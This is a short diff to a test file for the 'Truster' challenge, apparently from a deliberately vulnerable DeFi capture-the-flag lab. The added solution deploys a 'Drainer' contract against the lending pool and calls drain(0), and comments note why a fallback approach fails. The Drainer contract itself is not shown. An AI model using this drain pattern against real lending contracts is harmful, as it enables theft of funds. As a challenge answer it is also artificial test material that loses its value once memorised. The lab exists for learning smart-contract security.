@@ -23,6 +23,15 @@ describe('[Challenge] Truster', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const DrainerFactory = await ethers.getContractFactory('Drainer', player);
+        const drainer = await DrainerFactory.deploy(pool.address, token.address, player.address)
+
+        // fallback does not work --> nonReentract guard in the Truster contract.
+        // pass amount = 0 otherwise will revert RepayFailed(); 
+        
+        await drainer.connect(player).drain(0)
+        // expect(await token.balanceOf(drainer.address)).to.equal(TOKENS_IN_POOL);
+
     });
 
     after(async function () {
